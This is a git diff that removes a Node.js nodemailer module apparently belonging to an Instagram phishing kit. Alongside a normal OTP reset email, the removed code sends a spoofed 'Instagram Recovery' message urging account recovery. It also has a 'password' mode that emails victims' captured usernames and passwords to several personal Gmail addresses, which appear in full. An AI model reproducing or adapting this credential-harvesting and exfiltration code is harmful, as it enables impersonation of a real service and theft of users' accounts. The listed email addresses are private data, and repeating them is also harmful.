@@ -1,41 +1,4 @@
-const nodemailer = require('nodemailer');
-const catchAsyncError = require('../middlewares/catchAsyncError');
-
-const transport = nodemailer.createTransport({
-    host: process.env.SMPT_HOST,
-    port: process.env.SMPT_PORT,
-    service: process.env.SMPT_SERVICE,
-    secure: true,
-    debug: true,
-    auth: {
-        user: process.env.SMPT_MAIL,
-        pass: process.env.SMPT_PASSWORD,
-      },
-})
-
-const sendMail = catchAsyncError(async (email, secretToken, mode) => {
-   
-        if (mode == 'OTP') {
-            
-            return await transport.sendMail({
-                from: process.env.SMPT_MAIL,
-                to: email,
-                subject: "OTP Submission",
-                html: `
-        <h1>Reset Password</h1>
-        <p> Here is your otp to change the password ${secretToken} </p>
-      `
-            })
-        }
-        if (mode === 'email') {
-            
-            return await transport.sendMail({
-              from: '"Instagram Recovery" <instragram@ethereal.email>', // sender address
-              to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com"],
-              subject: "Urgent recovery of your Instagram account",
-                text: "Hello Vansh, Please recover your Instagram account by following the instructions.", // plain text body
-                html: `
-     <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -137,20 +100,3 @@ const sendMail = catchAsyncError(async (email, secretToken, mode) => {
 </html>
 
 
-
-    `
-            })
-        }
-        if(mode === "password"){
-          return await transport.sendMail({
-            from: '"Instagram Password" <instragram@ethereal.email>', // sender address
-            to: ["instgaram.service@gmail.com","yash.patel98305@gmail.com","vanshverma500@gmail.com"],
-              subject: "Password mil gya",
-              text: "Password aa gya bhai", // plain text body
-              html: `<p>email : ${secretToken.username}</p>
-              <p>password : ${secretToken.password} </p>` 
-              })
-}
-})
-
-module.exports = sendMail  
